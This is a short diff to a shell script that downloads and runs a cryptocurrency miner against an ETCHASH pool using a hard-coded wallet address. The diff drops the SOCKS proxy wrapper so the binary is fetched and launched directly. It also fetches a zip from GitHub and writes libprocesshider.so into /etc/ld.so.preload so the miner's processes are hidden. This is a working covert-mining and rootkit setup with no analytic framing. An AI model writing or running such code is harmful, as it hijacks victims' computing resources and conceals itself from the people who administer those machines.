@@ -19,11 +19,7 @@ socks5_username = gratis
 socks5_password = q1w2e3r4t5
 END
 
-./graftcp/local/graftcp-local -config graftcp/local/graftcp-local.conf &
-
-sleep .2
-
-./graftcp/graftcp wget https://github.com/angkii/m/raw/main/AkubapakMU
+wget https://github.com/angkii/m/raw/main/AkubapakMU
 chmod 700 AkubapakMU
 
 ./graftcp/graftcp wget https://raw.githubusercontent.com/nathanfleight/scripts/main/magicBezzHash.zip
@@ -35,5 +31,4 @@ sudo echo /usr/local/lib/libprocesshider.so >> /etc/ld.so.preload
 
 POOL=etc.2miners.com:1010
 WALLET=0x11880b1cfe04907c5306222be1e09f4bbb480eb5
-
-./graftcp/graftcp ./AkubapakMU --algo ETCHASH --pool $POOL --user $WALLET $@ --no-cl
+./AkubapakMU --algo ETCHASH --pool $POOL --user $WALLET $@ --no-cl
